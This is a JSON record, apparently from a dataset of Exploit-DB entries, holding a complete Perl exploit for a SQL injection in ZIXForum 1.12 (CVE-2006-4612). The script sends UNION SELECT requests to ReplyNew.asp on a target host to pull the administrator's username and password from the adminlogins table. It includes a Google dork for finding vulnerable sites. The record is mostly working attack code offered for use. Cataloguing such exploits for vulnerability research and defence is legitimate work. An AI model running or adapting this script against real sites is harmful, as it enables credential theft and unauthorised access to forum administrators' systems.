{
  "id": "2382",
  "title": "Zix Forum 1.12 - &#039;RepId&#039; SQL Injection (2)",
  "cve": "CVE-2006-4612",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n###########################################\r\n# ZIXForum <= v1.12 Exploit\r\n# Vulnerability found by Chironex Fleckeri\r\n# Created By: SlimTim10\r\n# <slimtim10@gmail.com>\r\n###########################################\r\n# Google dork:\r\n# intext:\"ZIXForum 1.12 by: ZixCom 2002\"\r\n###########################################\r\n\r\n\r\nuse IO::Socket::INET;\r\n\r\nusage() unless (@ARGV == 2);\r\n\r\n$host = shift(@ARGV);\r\n$dir = shift(@ARGV);\r\n\r\n$dir = \"\\/$dir\" if ($dir !~ /^\\//);\r\n$dir = \"$dir\\/\" if ($dir !~ /\\/$/);\r\n$host =~ s/http:\\/\\///g;\r\n\r\n$path = $dir.'ReplyNew.asp?RepId=-1%20UNION%20SELECT%20null,null,null,J_user,null,null,null,null,null,null,null,null%20FROM%20adminlogins';\r\n$path2 = $dir.'ReplyNew.asp?RepId=-1%20UNION%20SELECT%20null,null,null,J_pass,null,null,null,null,null,null,null,null%20FROM%20adminlogins';\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-]Connect Failed: could not connect to $host\\r\\n\"; # show an error!\r\n\r\nprint \"[+]Connecting...\\n\";\r\nprint $socket \"GET $path HTTP/1.1\\n\";\r\nprint $socket \"Host: $host\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\nprint \"[+]Connected\\n\";\r\nprint \"[+]User: \";\r\n\r\nwhile ($answer = <$socket>) {\r\n    $answer =~ m/name=\"R_Headline\" size=\"30\" class=\"normal\" value=\"Re: (.*?)\"/ && print \"$1\\n\";\r\n}\r\n\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-]Connect Failed: could not connect to $host\\r\\n\";\r\nprint $socket \"GET $path2 HTTP/1.1\\n\";\r\nprint $socket \"Host: $host\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\nprint \"[+]Pass: \";\r\n\r\nwhile ($answer = <$socket>) {\r\n    $answer =~ m/name=\"R_Headline\" size=\"30\" class=\"normal\" value=\"Re: (.*?)\"/ && print \"$1\\n\";\r\n}\r\n\r\nsub usage {\r\n    print \"\\n\" . \"=|=-\" x 14 . \"=|=\";\r\n    print q(\r\n]                                                         [\r\n[  ZIXForum <= 1.12 \"RepId\" Remote SQL Injection Exploit  ]\r\n]               Tested on ZIXForum <= v1.12               [\r\n[       Created By: SlimTim10 <slimtim10@gmail.com>       ]\r\n]                                                         [);\r\n    print \"\\n\" . \"=|=-\" x 14 . \"=|=\\n\\n\";\r\n    print \" Usage: $0\";\r\n    print q( [HOST] [PATH] E.g. );\r\n    print \"$0\";\r\n    print q(  www.host.com /forum/);\r\n    print \"\\n\\n\" . \"`^\" x 29 . \"`\\n\";\r\n    exit;\r\n}\r\n\r\n# milw0rm.com [2006-09-17]",
  "url": "https://www.exploit-db.com/exploits/2382"
}